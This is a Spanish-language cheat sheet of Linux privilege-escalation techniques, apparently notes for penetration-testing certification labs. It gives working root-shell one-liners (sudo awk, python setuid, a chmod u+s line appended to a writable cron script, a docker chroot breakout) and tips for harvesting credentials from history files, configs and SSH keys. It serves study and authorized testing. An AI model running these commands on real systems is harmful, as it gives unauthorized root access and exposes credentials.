# Privilege Escalation — Linux

> CWEE es web, pero muchas máquinas piden escalar tras el foothold. CWES/rutas
> de pentest lo exigen. Checklist pragmático.

## Enumeración automática

```bash
# Subir y correr (pspy para procesos, linpeas para todo)
./linpeas.sh | tee linpeas.out
./pspy64                 # procesos/cron sin ser root → revela tareas periódicas
```

Manual rápido:

```bash
id; sudo -l; uname -a
find / -perm -4000 -type f 2>/dev/null        # SUID
getcap -r / 2>/dev/null                        # capabilities
crontab -l; cat /etc/crontab; ls -la /etc/cron.*
netstat -tulnp                                 # servicios locales (pivot)
ls -la /home/*; cat ~/.bash_history
```

## Vectores frecuentes

### sudo
```bash
sudo -l                         # qué puedo correr como root
# Abusar binario permitido → GTFOBins (less, vi, awk, python, tar, find...)
sudo awk 'BEGIN{system("/bin/sh")}'
# Script en Python como root que falla y cae a pdb → !import os; os.system("/bin/sh")
# Script que usa una utilidad con config controlable (ej. descargador + config en $HOME)
```

### SUID / capabilities
```bash
# SUID → GTFOBins del binario
# Capability cap_setuid en python:
/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
```

### Cron / tareas periódicas
```bash
# pspy revela un script root que corre cada X min.
# Si el script (o un fichero que incluye, o su PATH) es escribible por tu grupo:
echo 'chmod u+s /bin/bash' >> /ruta/script_escribible
# luego:
/bin/bash -p
```

### Git hooks / config escribible
Si un cron como root hace `git` sobre un repo cuyo `.git/config` o hooks puedes
editar → ejecuta comandos como root vía `post-commit`/`pre-commit` o
`core.fsmonitor`.

### Credenciales en claro
`.env`, `config.php`, `settings.py`, `.bash_history`, `/var/backups`,
`.ssh/id_rsa`. **Password reuse**: prueba toda credencial encontrada en SSH y
otros usuarios (`su otro`).

### Kernel / CVE
```bash
uname -r      # versión → buscar exploit (ej. OverlayFS CVE-2023-0386, DirtyPipe, pwnkit)
```
Usar solo si está en el scope del lab; priorizar misconfig sobre kernel.

## Docker breakout / pivot
```bash
# Dentro de un contenedor con privilegios / socket montado:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Red interna del contenedor → escanear y pivotar al host o a otros contenedores.
```

## Recursos
- GTFOBins: https://gtfobins.github.io/
- PEASS-ng (linpeas): https://github.com/peass-ng/PEASS-ng
- pspy: https://github.com/DominicBreuker/pspy
